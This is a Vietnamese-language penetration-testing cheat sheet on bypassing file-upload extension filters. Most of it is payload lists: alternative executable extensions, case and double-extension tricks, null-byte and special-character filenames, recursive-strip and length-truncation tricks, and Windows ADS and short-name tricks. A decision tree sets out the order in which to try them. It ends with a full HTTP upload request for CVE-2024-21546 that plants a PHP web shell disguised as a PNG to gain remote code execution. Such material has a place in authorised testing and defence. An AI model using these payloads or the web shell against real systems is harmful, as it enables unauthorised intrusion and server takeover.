# File Upload — Extension Bypass

## Bản chất

Extension (phần mở rộng) là cơ chế phổ biến nhất để web server xác định loại file và quyết định cách xử lý. Khi server dựa vào extension để chặn file nguy hiểm, attacker có thể bypass bằng cách thao túng extension sao cho vượt qua validation nhưng vẫn được server thực thi.

Có hai mô hình kiểm tra extension: **blacklist** (chặn danh sách cấm) và **whitelist** (chỉ cho phép danh sách được phép). Mỗi mô hình có điểm yếu riêng.

## Bypass Blacklist

### Alternative Extensions

Blacklist thường chỉ chặn các extension phổ biến nhưng bỏ sót các extension thay thế mà server vẫn thực thi:

**PHP:**

```
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps
.pht, .phtm, .phtml, .pgif, .shtml, .phar, .inc
.hphp, .ctp, .module
```

PHPv8 hoạt động: `.php`, `.php4`, `.php5`, `.phtml`, `.module`, `.inc`, `.hphp`, `.ctp`

**ASP / ASP.NET:**

```
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd
.cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml
.asa, .cer, .shtml
```

**JSP (Java):**

```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```

**ColdFusion:**

```
.cfm, .cfml, .cfc, .dbm
```

**Perl:**

```
.pl, .cgi
```

**Khác:**

```
.swf (Flash), .yaws (Erlang)
```

### Case Manipulation

Nếu validation là case-sensitive nhưng server xử lý case-insensitive:

```
file.pHp
file.PhP5
file.pHP
file.Php
file.aSp
file.ASPX
```

### Double Extension

Khai thác cách server parse tên file khi có nhiều dấu chấm:

```
file.php.jpg        ← Apache có thể parse theo extension đầu tiên sau dấu chấm
file.php.png
file.jpg.php        ← Nếu server lấy extension cuối cùng
file.png.php5
file.png.phtml
```

**Apache misconfiguration**: Khi Apache được cấu hình `AddHandler application/x-httpd-php .php`, bất kỳ file nào có `.php` trong tên (không nhất thiết ở cuối) đều có thể bị thực thi:

```
file.php.png        ← Apache thực thi vì tên chứa .php
file.php.jpg
```

### Null Byte Injection

Chèn null byte (`\x00`) giữa extension nguy hiểm và extension cho phép. Null byte đóng vai trò kết thúc chuỗi trong C/C++, nhưng ngôn ngữ bậc cao hơn (PHP, Java) có thể bỏ qua phần sau null byte khi ghi file:

```
file.php%00.jpg          ← URL-encoded null byte
file.php\x00.jpg         ← Raw null byte
file.asp%00.jpg
file.php%00.png%00.jpg   ← Multiple null bytes
```

### Special Characters

| Ký tự         | Payload          | Cơ chế                             |
| ------------- | ---------------- | ---------------------------------- |
| Space         | `file.php%20`    | Trailing space bị bỏ qua khi lưu   |
| Dot           | `file.php.`      | Trailing dot bị strip trên Windows |
| Multiple dots | `file.php....`   | OS tự xóa trailing dots            |
| Newline       | `file.php%0a`    | Line feed có thể bypass regex      |
| CR+LF         | `file.php%0d%0a` | Carriage return + line feed        |
| Slash         | `file.php/`      | Trailing slash bị bỏ khi lưu       |
| Backslash     | `file.php.\`     | Windows path separator             |
| Semicolon     | `file.asp;.jpg`  | IIS6 cắt tên tại semicolon         |

### Null byte + Special chars kết hợp

```
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
file.php#.png
```

### Recursive Stripping Bypass

Khi server strip extension nguy hiểm (xóa `.php` khỏi tên file), có thể lồng extension:

```
file.p.phphp         ← Sau khi xóa ".php" → file.php
file.pphphp          ← Sau khi xóa ".php" → file.php
file.php.php         ← Xóa một lần? → file.php
file..telerik.asp    ← phụ thuộc logic strip
```

### Filename Length Truncation

Khai thác giới hạn chiều dài filename của OS (Linux: 255 bytes, Windows NTFS: 255 chars) — file extension hợp lệ bị cắt bỏ, giữ lại extension nguy hiểm:

```bash
# Tạo payload với 232 ký tự "A" + .php + .png
# Tổng cộng 236 + ".png" vượt quá giới hạn
# OS cắt bớt, giữ lại .php

python -c 'print("A" * 232 + ".php.png")'
# Server lưu: AAAA...AAAA.php (cắt .png)
```

```bash
# Metasploit pattern cho kiểm tra
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
```

**Quy trình thực hiện:**

1. Upload file có tên dài với extension hợp lệ ở cuối, kiểm tra response xem server cho phép bao nhiêu ký tự
2. Tính toán để `.php` nằm trong giới hạn nhưng `.png` bị cắt
3. Upload payload

### Windows-specific Tricks

**NTFS Alternate Data Stream (ADS):**

```
file.asp::$data          ← Truy cập default data stream, bỏ qua extension check
file.asp::$data.         ← Thêm dot sau ADS pattern
file.asax:.jpg           ← Tạo file empty với extension bị cấm
```

**Windows 8.3 Short Filename:**

```
web~1.con               ← Thay thế web.config
HTACCE~1                ← Thay thế .htaccess
```

**Reserved Names (gây crash/DoS/info disclosure):**

```
CON, PRN, AUX, NUL
COM1-COM9, LPT1-LPT9
```

**Character Conversion (PHP trên IIS):**

- `>` → `?`
- `<` → `*`
- `"` → `.`

```
Filename: web<<           ← Trên IIS+PHP, chuyển thành web.* → match web.config
```

### Linux-specific Tricks

```
file.php/.              ← Trailing dot+slash bị bỏ
file.php%20             ← Trailing space
file.php\               ← Trailing backslash
```

## Bypass Whitelist

Whitelist an toàn hơn blacklist nhưng vẫn có thể bypass:

### Double Extension (Extension trước)

Nếu whitelist kiểm tra extension cuối cùng:

```
file.php.jpg            ← Whitelist thấy .jpg (allowed)
file.asp.png            ← Apache vẫn có thể thực thi vì thấy .php/.asp
```

### Double Extension (Extension sau)

Nếu whitelist kiểm tra extension đầu tiên:

```
file.jpg.php            ← Whitelist thấy .jpg (allowed), server thực thi .php
```

### Null Byte trước extension hợp lệ

```
file.php%00.jpg         ← Whitelist thấy .jpg, server lưu file.php
file.asp%00.png
```

### Whitelist chứa extension nguy hiểm

Kiểm tra whitelist có chứa extension thực sự nguy hiểm:

- `.shtml` → Server Side Includes (SSI) injection
- `.svg` → XSS thông qua JavaScript trong SVG
- `.xml` → XXE injection
- `.html` → Stored XSS
- `.pdf` → JavaScript execution trong PDF viewer

## Extension Bypass Decision Tree

```
Upload bị từ chối do extension?
│
├── Blacklist detected
│   ├── Thử alternative extensions (.php5, .phtml, .phar...)
│   ├── Thử case manipulation (.pHp, .PhP5...)
│   ├── Thử double extension (file.php.jpg)
│   ├── Thử null byte (file.php%00.jpg)
│   ├── Thử special chars (%20, %0a, trailing dot)
│   ├── Thử recursive strip bypass (file.p.phphp)
│   └── Thử filename truncation (very long name + .php.png)
│
├── Whitelist detected
│   ├── Thử double extension (file.php.jpg nếu check last ext)
│   ├── Thử null byte trước allowed extension
│   ├── Thử special chars giữa extensions
│   └── Kiểm tra whitelist có chứa ext nguy hiểm (.shtml, .svg)
│
└── Không rõ loại filter
    ├── Upload file extension lạ (.xyz) → Nếu accepted = whitelist miss
    ├── Upload .php → Nếu blocked, thử .php5 → Phân biệt black/white
    └── Kết hợp nhiều kỹ thuật trên
```

## Trailing Dot Bypass — CVE thực tế

**UniSharp Laravel Filemanager < 2.9.1 (CVE-2024-21546):**

Server strip trailing dot từ filename, dẫn đến bypass extension validation:

```http
POST /profile/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="upload"; filename="shell.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------Boundary--
```

Server strip trailing dot → file được lưu thành `shell.php` → RCE.
